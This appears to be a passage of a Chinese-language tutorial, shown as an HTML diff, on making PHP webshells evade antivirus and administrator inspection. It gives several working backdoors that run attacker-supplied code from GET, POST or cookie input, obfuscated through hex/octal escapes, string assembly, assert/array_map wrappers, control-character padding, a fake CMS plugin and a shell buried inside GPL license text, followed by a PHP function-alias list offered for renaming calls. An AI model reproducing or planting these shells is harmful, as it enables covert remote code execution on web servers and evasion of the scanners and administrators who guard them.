+<p>bin2hex</p>
+</li>
+<li>
+<p>strrev</p>
+</li>
+<li>
+<p>urlencode</p>
+</li>
+<li>
+<p>json_encode</p>
+</li>
+<li>
+<p>pack</p>
+</li>
+<li>
+<p>gzcompress/gzdeflate/gzencode</p>
+</li>
+<li>
+<p>...</p>
+</li>
+</ul>
+<p>另外我们还可以通过十六进制/八进制编码,取反，异或，加密，序列化,函数名大小写等等来对webshell进行变形,例如利用十六进制与八进制混编的ALLKILL webshell:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="c1">// (ALLKILL) 参考https://www.freebuf.com/articles/web/155891.html中进制转换方式</span>
+<span class="nv">$v230c590</span><span class="o">=</span><span class="s2">&quot;</span><span class="se">\x62\x61\163\x65\x36\x34\137\144\145\x63\x6f\144\145</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="nv">$v230c590</span><span class="p">(</span><span class="k">null</span><span class="o">.</span><span class="nb">next</span><span class="p">(</span><span class="nx">post</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">));</span>
+</code></pre></div>
+<p>又如利用面向对象特性,字符拼接,动态调用变形的ALLKILL webshell:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="c1">// (ALLKILL)</span>
+<span class="nv">$name</span>  <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<span class="k">class</span> <span class="nc">combine</span> <span class="p">{</span>
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$var</span><span class="p">,</span> <span class="nv">$srcname</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span> <span class="o">=</span> <span class="nv">$var</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$srcname</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cookie</span> <span class="o">=</span> <span class="nb">get_class</span><span class="p">(</span><span class="nv">$this</span><span class="p">);</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cookie</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cookie</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="nf">__combine</span><span class="p">(</span><span class="nv">$yum</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$run</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="p">;</span>
+        <span class="nv">$run</span> <span class="o">.=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
+        <span class="nv">$run</span> <span class="o">.=</span> <span class="s1">&#39;e&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cookie</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">yum</span> <span class="o">=</span> <span class="nv">$yum</span><span class="p">;</span>
+        <span class="nv">$run</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">yum</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$result</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">combine</span><span class="p">(</span><span class="s1">&#39;sys&#39;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>  <span class="c1">// php5 php7 success</span>
+<span class="k">die</span><span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="na">__combine</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="mi">2333</span><span class="p">]));</span>
+</code></pre></div>
+<p><strong>伪装则是一种有效通过静态检测的方法(虽然有点玄学,例如D盾似乎有对文件行数进行判断),我们将webshell伪装成一个正常的功能,并配上掩人耳目的名字,甚至可以逃过管理员的检查,例如下面几个例子:</strong></p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="sd">/**</span>
+<span class="sd"> * new plugin</span>
+<span class="sd"> * @author xxcms</span>
+<span class="sd"> * @package Glimmer</span>
+<span class="sd"> * @subpackage PluginsShared</span>
+<span class="sd"> */</span>
+<span class="sd">/**</span>
+<span class="sd"> * get a compiler parameter and echo to console</span>
+<span class="sd"> */</span>
+<span class="k">function</span> <span class="nf">get_compiler_param</span><span class="p">(</span><span class="nv">$params</span><span class="p">,</span> <span class="nv">$index</span><span class="p">,</span> <span class="nv">$default</span><span class="o">=</span><span class="k">null</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="nv">$index</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nv">$default</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^([\&#39;&quot;]?)[a-zA-Z0-9](\\1)/&#39;</span><span class="p">,</span> <span class="nv">$params</span><span class="p">[</span><span class="nv">$index</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$index</span><span class="s2"> is not a literal&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nv">$t</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+    <span class="k">eval</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\$</span><span class="s2">t = &quot;</span> <span class="o">.</span> <span class="nv">$params</span><span class="p">[</span><span class="nv">$index</span><span class="p">]);</span>
+    <span class="k">return</span> <span class="nv">$t</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nv">$params</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;code&#39;</span><span class="o">=&gt;</span><span class="nv">$_GET</span><span class="p">[</span><span class="mi">2333</span><span class="p">]);</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="nx">get_compiler_param</span><span class="p">(</span><span class="nv">$params</span><span class="p">,</span><span class="s1">&#39;code&#39;</span><span class="p">,</span> <span class="s2">&quot;whoami&quot;</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;print&#39;</span><span class="p">])){</span>
+    <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;script&gt;console.log(&#39;&quot;</span><span class="o">.</span><span class="nv">$a</span><span class="o">.</span><span class="s2">&quot;&#39;);&lt;/script&gt;&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="c1">// 这个马由于extract及明显的动态调用过不了免杀,但是仍不失为一种好思路</span>
+      <span class="c1">// copy from http://webshell.cdxy.me/</span>
+        <span class="cm">/*            GNU GENERAL PUBLIC LICENSE</span>
+<span class="cm">                       Version 3, 29 June 2007</span>
+
+<span class="cm">Copyright (C) 2007 Free Software Foundation, Inc. &lt;http://fsf.org/&gt;</span>
+<span class="cm">Everyone is permitted to copy and distribute verbatim copies</span>
+<span class="cm">of this license document, but changing it is not allowed.</span>
+
+<span class="cm">                        Preamble</span>
+
+<span class="cm">The GNU General Public License is a free, copyleft license for</span>
+<span class="cm">software and other kinds of works.</span>
+
+<span class="cm">The licenses for most software and other practical works are designed</span>
+<span class="cm">to take away your freedom to share and change the works.  By contrast,</span>
+<span class="cm">the GNU General Public License is intended to guarantee your freedom to</span>
+<span class="cm">share and change all versions of a program--to make sure it remains free</span>
+<span class="cm">software for all its users.  We, the Free Software Foundation, use the</span>
+<span class="cm">GNU General Public License for most of our software; it applies also to</span>
+<span class="cm">any other work released this way by its authors.  You can apply it to</span>
+<span class="cm">your programs, too.</span>
+
+<span class="cm">When we speak of free software, we are referring to freedom, not</span>
+<span class="cm">price.  Our General Public Licenses are designed to make sure that you</span>
+<span class="cm">have the freedom to distribute copies of free software (and charge for</span>
+<span class="cm">them if you wish), that you receive source code or can get it if you</span>
+<span class="cm">want it, that you can change the software or use pieces of it in new</span>
+<span class="cm">free programs, and that you know you can do these things.</span>
+
+<span class="cm">To protect your rights, we need to prevent others from denying you</span>
+<span class="cm">these rights or asking you to surrender the rights.  Therefore, you have</span>
+<span class="cm">certain responsibilities if you distribute copies of the software, or if</span>
+<span class="cm">you modify it: responsibilities to respect the freedom of others.</span>
+
+<span class="cm">For example, if you distribute copies of such a program, whether</span>
+<span class="cm">gratis or for a fee, you must pass on to the recipients the same</span>
+<span class="cm">freedoms that you received.  You must make sure that they, too, receive</span>
+<span class="cm">or can get the source code.  And you must show them these terms so they</span>
+<span class="cm">know their rights.</span>
+
+<span class="cm">Developers that use the GNU GPL protect your rights with two steps:</span>
+<span class="cm">(1) assert copyright on the software, and (2) offer you this License</span>
+<span class="cm">giving you */</span><span class="nb">extract</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">);</span><span class="cm">/* copy, distribute and/or modify it.</span>
+
+<span class="cm">For the developers&#39; and authors&#39; protection, the GPL clearly explains</span>
+<span class="cm">that there is no warranty for this free software.  For both users&#39; and</span>
+<span class="cm">authors&#39; sake, the GPL requires that modified versions be marked as</span>
+<span class="cm">changed, so that their problems will not be attributed erroneously to</span>
+<span class="cm">authors of previous versions.</span>
+
+<span class="cm">Some devices are designed to deny users access to install or run</span>
+<span class="cm">modified versions of the software inside them, although the manufacturer</span>
+<span class="cm">can do so.  This is fundamentally incompatible with the aim of</span>
+<span class="cm">protecting users&#39; freedom to change the software.  The systematic</span>
+<span class="cm">pattern of such abuse occurs in the area of products for individuals to</span>
+<span class="cm">use, which is precisely where it is most unacceptable.  Therefore, we</span>
+<span class="cm">have designed this version of the GPL to prohibit the practice for those</span>
+<span class="cm">products.  If such problems arise substantially in other domains, we</span>
+<span class="cm">stand ready to extend this provision to those domains in future versions</span>
+<span class="cm">of the GPL, as needed to protect the freedom of users.</span>
+
+<span class="cm">Finally, every program is threatened constantly by software patents.</span>
+<span class="cm">States should not allow patents to restrict development and use of</span>
+<span class="cm">software on general-purpose computers, but in those that do, we wish to</span>
+<span class="cm">avoid the special danger that patents applied to a free program could</span>
+<span class="cm">make it effectively proprietary. patents applied to  GPL assures that</span>
+<span class="cm">patents cannot be used to render the program non-free.</span>
+
+<span class="cm">The precise terms and conditions for copying, distribution and</span>
+<span class="cm">modification follow.</span>
+
+<span class="cm">                   TERMS AND CONDITIONS</span>
+
+<span class="cm">0. Definitions.</span>
+
+<span class="cm">&quot;This License&quot; refers to version 3 of the GNU General Public License.</span>
+
+<span class="cm">&quot;Copyright&quot; also means copyright-like laws that apply to other kinds of</span>
+<span class="cm">works, such as semiconductor masks.</span>
+
+<span class="cm">&quot;The Program&quot; refers to any copyrightable work licensed under this</span>
+<span class="cm">License.  Each licensee is addressed as &quot;you&quot;.  &quot;Licensees&quot; and</span>
+<span class="cm">&quot;recipients&quot; may be individuals or organizations.</span>
+
+<span class="cm">To &quot;modify&quot; a work means to copy from or adapt all or part of the work</span>
+<span class="cm">in a fashion requiring copyright permission, other than the making of an</span>
+<span class="cm">exact copy.  The resulting work is called a &quot;modified version&quot; of the</span>
+<span class="cm">earlier work or a work &quot;based on&quot; the earlier work.</span>
+
+<span class="cm">A &quot;covered work&quot; means either the unmodified Program or a work based</span>
+<span class="cm">on the Program.</span>
+
+<span class="cm">To &quot;propagate&quot; a work means to do anything with it that, without</span>
+<span class="cm">permission, would make you directly or secondarily liable for</span>
+<span class="cm">infringement under applicable copyright law, except executing it on a</span>
+<span class="cm">computer or modifying a private copy.  Propagation includes copying,</span>
+<span class="cm">distribution (with or without modification), making available to the</span>
+<span class="cm">public, and in some countries other activities as well.</span>
+
+<span class="cm">To &quot;convey&quot; a work means any kind of propagation that enables other</span>
+<span class="cm">parties to make or receive copies.  Mere interaction with a user through</span>
+<span class="cm">a computer network, with no transfer of a copy, is not conveying.</span>
+
+<span class="cm">An interactive user interface displays &quot;Appropriate Legal Notices&quot;</span>
+<span class="cm">to the extent that it includes a convenient and prominently visible</span>
+<span class="cm">feature that (1) displays an appropriate copyright notice, and (2)</span>
+<span class="cm">tells the user that there is no warranty for the work (except to the</span>
+<span class="cm">extent that warranties are provided), that licensees may convey the</span>
+<span class="cm">work under this License, and how to view a copy of this License.  If</span>
+<span class="cm">the interface presents a list of user commands or options, such as a</span>
+<span class="cm">menu, a prominent item in the list meets this criterion.</span>
+
+<span class="cm">1. Source Code.</span>
+
+<span class="cm">The &quot;source code&quot; for a work means the preferred form of the work</span>
+<span class="cm">for making modifications to it.  &quot;Object code&quot; means any non-source</span>
+<span class="cm">form of a work.</span>
+
+<span class="cm">A &quot;Standard Interface&quot; means an interface that either is an official</span>
+<span class="cm">standard defined by a recognized standards body, or, in the case of</span>
+<span class="cm">interfaces specified for a particular programming language, one that</span>
+<span class="cm">is widely used among developers working in that language.</span>
+
+<span class="cm">The &quot;System Libraries&quot; of an executable work include anything, other</span>
+<span class="cm">than the work as a whole, that (a) is included in the normal form of</span>
+<span class="cm">packaging a Major Component, but which is not part of that Major</span>
+<span class="cm">Component, and (b) serves only to enable use of the work with that</span>
+<span class="cm">Major Component, or to implement a Standard Interface for which an</span>
+<span class="cm">implementation is available to the public in source code form.  A</span>
+<span class="cm">&quot;Major Component&quot;, in this context, means a major essential component</span>
+<span class="cm">(kernel, window system, and so on) of the specific operating system</span>
+<span class="cm">(if any) on which the executable work runs, or a compiler used to</span>
+<span class="cm">produce the work, or an object code interpreter used to run it.</span>
+
+<span class="cm">The &quot;Corresponding Source&quot; for a work in object code form means all</span>
+<span class="cm">the source code needed to generate, install, and (for an executable</span>
+<span class="cm">work) run the object code and to modify the work, including scripts to</span>
+<span class="cm">control those activities.  However, it does not include the work&#39;s</span>
+<span class="cm">System Libraries, or general-purpose tools or generally available free</span>
+<span class="cm">programs which are used unmodified in performing those activities but</span>
+<span class="cm">which are not */</span><span class="o">@</span><span class="nv">$PC4E20</span><span class="o">&amp;&amp;@</span><span class="nv">$F</span><span class="p">(</span><span class="nv">$A</span><span class="p">,</span><span class="nv">$B</span><span class="p">);</span><span class="cm">/*.  For example, Corresponding Source</span>
+
+<span class="cm">the work, and the source code for shared libraries and dynamically</span>
+<span class="cm">linked subprograms that the work is specifically designed to require,</span>
+<span class="cm">such as by intimate data communication or control flow between those</span>
+<span class="cm">subprograms and other parts of the work.</span>
+
+<span class="cm">The Corresponding Source need not include anything that users</span>
+<span class="cm">can regenerate automatically from other parts of the Corresponding</span>
+<span class="cm">Source.</span>
+
+<span class="cm">The Corresponding Source for a work in source code form is that</span>
+<span class="cm">same work.</span>
+
+<span class="cm">2. Basic Permissions.</span>
+
+<span class="cm">All rights granted under this License are granted for the term of</span>
+<span class="cm">copyright on the Program, and are irrevocable provided the stated</span>
+<span class="cm">conditions are met.  This License explicitly affirms your unlimited</span>
+<span class="cm">permission to run the unmodified Program.  The output from running a</span>
+<span class="cm">covered work is covered by this License only if the output, given its</span>
+<span class="cm">content, constitutes a covered work.  This License acknowledges your</span>
+<span class="cm">rights of fair use or other equivalent, as provided by copyright law.</span>
+
+<span class="cm">You may make, run and propagate covered works that you do not</span>
+<span class="cm">convey, without conditions so long as your license otherwise remains</span>
+<span class="cm">in force.  You may convey covered works to others for the sole purpose</span>
+<span class="cm">of having them make modifications exclusively for you, or provide you</span>
+<span class="cm">with facilities for running those works, provided that you comply with</span>
+<span class="cm">the terms of this License in conveying all material for which you do</span>
+<span class="cm">not control copyright.  Those thus making or running the covered works</span>
+<span class="cm">for you must do so exclusively on your behalf, under your direction</span>
+<span class="cm">and control, on terms that prohibit them from making any copies of</span>
+<span class="cm">your copyrighted material outside their relationship with you.</span>
+
+<span class="cm">Conveying under any other circumstances is permitted solely under</span>
+<span class="cm">the conditions stated below.  Sublicensing is not allowed; section 10</span>
+<span class="cm">makes it unnecessary. */</span> <span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>也许上面的方法只使用一种的话无法达到免杀的目的,但是我们可以尝试嵌套使用,如定义一个函数/类,在里面进行调用</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="c1">// copy from https://xz.aliyun.com/t/5152</span>
+<span class="k">function</span> <span class="nf">test</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="nv">$b</span><span class="p">){</span>
+    <span class="nb">array_map</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="nv">$b</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nx">test</span><span class="p">(</span><span class="nb">assert</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]));</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="c1">// copy from https://xz.aliyun.com/t/5152</span>
+<span class="k">class</span> <span class="nc">loveme</span> <span class="p">{</span>
+    <span class="k">var</span> <span class="nv">$a</span><span class="p">;</span>
+    <span class="k">var</span> <span class="nv">$b</span><span class="p">;</span>
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="nv">$b</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">=</span><span class="nv">$a</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span><span class="o">=</span><span class="nv">$b</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="nf">test</span><span class="p">()</span> <span class="p">{</span>
+       <span class="nb">array_map</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$p1</span><span class="o">=</span><span class="k">new</span> <span class="nx">loveme</span><span class="p">(</span><span class="nb">assert</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]));</span>
+<span class="nv">$p1</span><span class="o">-&gt;</span><span class="na">test</span><span class="p">();</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<h3 id="符号干扰">符号干扰<a class="headerlink" href="#符号干扰" title="Permanent link">#</a></h3>
+<p><strong>这种方法通常用于干扰查杀的正则判断,可以使用的符号有null,\n,\r,\t等</strong></p>
+<p>常用的方式是将这些字符与字符串进行拼接,如果你的webshell被杀了,可以尝试一下, 如:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="c1">// copy from https://xz.aliyun.com/t/5152</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
+<span class="nv">$b</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+<span class="k">eval</span><span class="p">(</span><span class="nv">$b</span><span class="o">.</span><span class="nv">$a</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="c1">// copy from https://xz.aliyun.com/t/5152</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
+<span class="nv">$b</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="k">eval</span><span class="p">(</span><span class="nv">$b</span><span class="o">.=</span><span class="nv">$a</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>还有一种比较骚的姿势在函数调用中是插入一些控制符<strong>[\x00-\x20]</strong>,PHP引擎会忽略这些控制字符,正确执行PHP函数,如:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>  <span class="c1">// copy from https://bbs.symbo1.com/t/topic/94</span>
+<span class="k">eval</span><span class="nx">\x01\x02</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">2333</span><span class="p">]);</span>  <span class="c1">//这里\x01与\x02要转换为实际的字符</span>
+</code></pre></div>
+<h3 id="别名重命名">别名/重命名<a class="headerlink" href="#别名重命名" title="Permanent link">#</a></h3>
+<p><strong>其实PHP中是有很多函数别名的,如pos是current的别名,在PHP5.6加入了函数名的命名空间之后我们甚至可以自己创造"别名".</strong></p>
+<p>这里附一个PHP7.4.3中函数别名表(个人整理,可能会有错/漏)</p>
+<div class="highlight"><pre><span></span><code>bzwrite-&gt;fwrite
+bzflush-&gt;fflush
+bzclose-&gt;fclose
+isId-&gt;dom_attr_is_id
+substringData-&gt;dom_characterdata_substring_data
+appendData-&gt;dom_characterdata_append_data
+insertData-&gt;dom_characterdata_insert_data
+deleteData-&gt;dom_characterdata_delete_data
+replaceData-&gt;dom_characterdata_replace_data
+createElement-&gt;dom_document_create_element
+createDocumentFragment-&gt;dom_document_create_document_fragment
+createTextNode-&gt;dom_document_create_text_node
+createComment-&gt;dom_document_create_comment
+createCDATASection-&gt;dom_document_create_cdatasection
+createProcessingInstruction-&gt;dom_document_create_processing_instruction
+createAttribute-&gt;dom_document_create_attribute
+createEntityReference-&gt;dom_document_create_entity_reference
+getElementsByTagName-&gt;dom_document_get_elements_by_tag_name
+importNode-&gt;dom_document_import_node
+createElementNS-&gt;dom_document_create_element_ns
+createAttributeNS-&gt;dom_document_create_attribute_ns
+getElementsByTagNameNS-&gt;dom_document_get_elements_by_tag_name_ns
+getElementById-&gt;dom_document_get_element_by_id
+adoptNode-&gt;dom_document_adopt_node
+normalizeDocument-&gt;dom_document_normalize_document
+renameNode-&gt;dom_document_rename_node
+save-&gt;dom_document_save
+saveXML-&gt;dom_document_savexml
+validate-&gt;dom_document_validate
+xinclude-&gt;dom_document_xinclude
+saveHTML-&gt;dom_document_save_html
+saveHTMLFile-&gt;dom_document_save_html_file
+schemaValidate-&gt;dom_document_schema_validate_file
+schemaValidateSource-&gt;dom_document_schema_validate_xml
+relaxNGValidate-&gt;dom_document_relaxNG_validate_file
+relaxNGValidateSource-&gt;dom_document_relaxNG_validate_xml
+setParameter-&gt;dom_domconfiguration_set_parameter
+getParameter-&gt;dom_domconfiguration_get_parameter
+canSetParameter-&gt;dom_domconfiguration_can_set_parameter
+handleError-&gt;dom_domerrorhandler_handle_error
+item-&gt;dom_domimplementationlist_item
+getDomimplementation-&gt;dom_domimplementationsource_get_domimplementation
+getDomimplementations-&gt;dom_domimplementationsource_get_domimplementations
+item-&gt;dom_domstringlist_item
+getAttribute-&gt;dom_element_get_attribute
+setAttribute-&gt;dom_element_set_attribute
+removeAttribute-&gt;dom_element_remove_attribute
+getAttributeNode-&gt;dom_element_get_attribute_node
+setAttributeNode-&gt;dom_element_set_attribute_node
+removeAttributeNode-&gt;dom_element_remove_attribute_node
+getElementsByTagName-&gt;dom_element_get_elements_by_tag_name
+getAttributeNS-&gt;dom_element_get_attribute_ns
+setAttributeNS-&gt;dom_element_set_attribute_ns
+removeAttributeNS-&gt;dom_element_remove_attribute_ns
+getAttributeNodeNS-&gt;dom_element_get_attribute_node_ns
+setAttributeNodeNS-&gt;dom_element_set_attribute_node_ns
+getElementsByTagNameNS-&gt;dom_element_get_elements_by_tag_name_ns
+hasAttribute-&gt;dom_element_has_attribute
+hasAttributeNS-&gt;dom_element_has_attribute_ns
+setIdAttribute-&gt;dom_element_set_id_attribute
+setIdAttributeNS-&gt;dom_element_set_id_attribute_ns
+setIdAttributeNode-&gt;dom_element_set_id_attribute_node
+getNamedItem-&gt;dom_namednodemap_get_named_item
+setNamedItem-&gt;dom_namednodemap_set_named_item
+removeNamedItem-&gt;dom_namednodemap_remove_named_item
+item-&gt;dom_namednodemap_item
+getNamedItemNS-&gt;dom_namednodemap_get_named_item_ns
+setNamedItemNS-&gt;dom_namednodemap_set_named_item_ns
+removeNamedItemNS-&gt;dom_namednodemap_remove_named_item_ns
+count-&gt;dom_namednodemap_count
+getName-&gt;dom_namelist_get_name
+getNamespaceURI-&gt;dom_namelist_get_namespace_uri
+insertBefore-&gt;dom_node_insert_before
+replaceChild-&gt;dom_node_replace_child
+removeChild-&gt;dom_node_remove_child
+appendChild-&gt;dom_node_append_child
+hasChildNodes-&gt;dom_node_has_child_nodes
+cloneNode-&gt;dom_node_clone_node
+normalize-&gt;dom_node_normalize
+isSupported-&gt;dom_node_is_supported
+hasAttributes-&gt;dom_node_has_attributes
+compareDocumentPosition-&gt;dom_node_compare_document_position
+isSameNode-&gt;dom_node_is_same_node
+lookupPrefix-&gt;dom_node_lookup_prefix
+isDefaultNamespace-&gt;dom_node_is_default_namespace
+lookupNamespaceUri-&gt;dom_node_lookup_namespace_uri
+isEqualNode-&gt;dom_node_is_equal_node
+getFeature-&gt;dom_node_get_feature
+setUserData-&gt;dom_node_set_user_data
+getUserData-&gt;dom_node_get_user_data
+item-&gt;dom_nodelist_item
+count-&gt;dom_nodelist_count
+findOffset16-&gt;dom_string_extend_find_offset16
+findOffset32-&gt;dom_string_extend_find_offset32
+splitText-&gt;dom_text_split_text
+isWhitespaceInElementContent-&gt;dom_text_is_whitespace_in_element_content
+isElementContentWhitespace-&gt;dom_text_is_whitespace_in_element_content
+replaceWholeText-&gt;dom_text_replace_whole_text
+handle-&gt;dom_userdatahandler_handle
+registerNamespace-&gt;dom_xpath_register_ns
+query-&gt;dom_xpath_query
+evaluate-&gt;dom_xpath_evaluate
+registerPhpFunctions-&gt;dom_xpath_register_php_functions
+ftp_quit-&gt;ftp_close
+imap_header-&gt;imap_headerinfo
+imap_listmailbox-&gt;imap_list
+imap_getmailboxes-&gt;imap_list_full
+imap_scanmailbox-&gt;imap_listscan
+imap_listsubscribed-&gt;imap_lsub
+imap_getsubscribed-&gt;imap_lsub_full
+imap_fetchtext-&gt;imap_body
+imap_scan-&gt;imap_listscan
+imap_create-&gt;imap_createmailbox
+imap_rename-&gt;imap_renamemailbox
+ldap_close-&gt;ldap_unbind
+ldap_get_values-&gt;ldap_get_values_len
+ldap_modify-&gt;ldap_mod_replace
+mysqli_execute-&gt;mysqli_stmt_execute
+mysqli_escape_string-&gt;mysqli_real_escape_string
+mysqli_set_opt-&gt;mysqli_options
+autocommit-&gt;mysqli_autocommit
+begin_transaction-&gt;mysqli_begin_transaction
+change_user-&gt;mysqli_change_user
+character_set_name-&gt;mysqli_character_set_name
+close-&gt;mysqli_close
+commit-&gt;mysqli_commit
+connect-&gt;mysqli_connect
+dump_debug_info-&gt;mysqli_dump_debug_info
+debug-&gt;mysqli_debug
+get_charset-&gt;mysqli_get_charset
+get_client_info-&gt;mysqli_get_client_info
+get_client_info-&gt;mysqli_get_client_info
+get_connection_stats-&gt;mysqli_get_connection_stats
+get_server_info-&gt;mysqli_get_server_info
+get_warnings-&gt;mysqli_get_warnings
+init-&gt;mysqli_init_method
+kill-&gt;mysqli_kill
+multi_query-&gt;mysqli_multi_query
+construct-&gt;mysqli_link_construct
+more_results-&gt;mysqli_more_results
+next_result-&gt;mysqli_next_result
+options-&gt;mysqli_options
+ping-&gt;mysqli_ping
+prepare-&gt;mysqli_prepare
+query-&gt;mysqli_query
+real_connect-&gt;mysqli_real_connect
+real_escape_string-&gt;mysqli_real_escape_string
+escape_string-&gt;mysqli_real_escape_string
+real_query-&gt;mysqli_real_query
+release_savepoint-&gt;mysqli_release_savepoint
+rollback-&gt;mysqli_rollback
+savepoint-&gt;mysqli_savepoint
+select_db-&gt;mysqli_select_db
+set_charset-&gt;mysqli_set_charset
+set_opt-&gt;mysqli_options
+ssl_set-&gt;mysqli_ssl_set
+stat-&gt;mysqli_stat
+stmt_init-&gt;mysqli_stmt_init
+store_result-&gt;mysqli_store_result
+thread_safe-&gt;mysqli_thread_safe
+use_result-&gt;mysqli_use_result
+refresh-&gt;mysqli_refresh
+construct-&gt;mysqli_result_construct
+close-&gt;mysqli_free_result
+free-&gt;mysqli_free_result
+data_seek-&gt;mysqli_data_seek
+fetch_field-&gt;mysqli_fetch_field
+fetch_fields-&gt;mysqli_fetch_fields
+fetch_field_direct-&gt;mysqli_fetch_field_direct
+fetch_all-&gt;mysqli_fetch_all
+fetch_array-&gt;mysqli_fetch_array
+fetch_assoc-&gt;mysqli_fetch_assoc
+fetch_object-&gt;mysqli_fetch_object
+fetch_row-&gt;mysqli_fetch_row
+field_seek-&gt;mysqli_field_seek
+free_result-&gt;mysqli_free_result
+construct-&gt;mysqli_stmt_construct
+attr_get-&gt;mysqli_stmt_attr_get
+attr_set-&gt;mysqli_stmt_attr_set
+bind_param-&gt;mysqli_stmt_bind_param
+bind_result-&gt;mysqli_stmt_bind_result
+close-&gt;mysqli_stmt_close
+data_seek-&gt;mysqli_stmt_data_seek
+execute-&gt;mysqli_stmt_execute
+fetch-&gt;mysqli_stmt_fetch
+get_warnings-&gt;mysqli_stmt_get_warnings
+result_metadata-&gt;mysqli_stmt_result_metadata
+more_results-&gt;mysqli_stmt_more_results
+next_result-&gt;mysqli_stmt_next_result
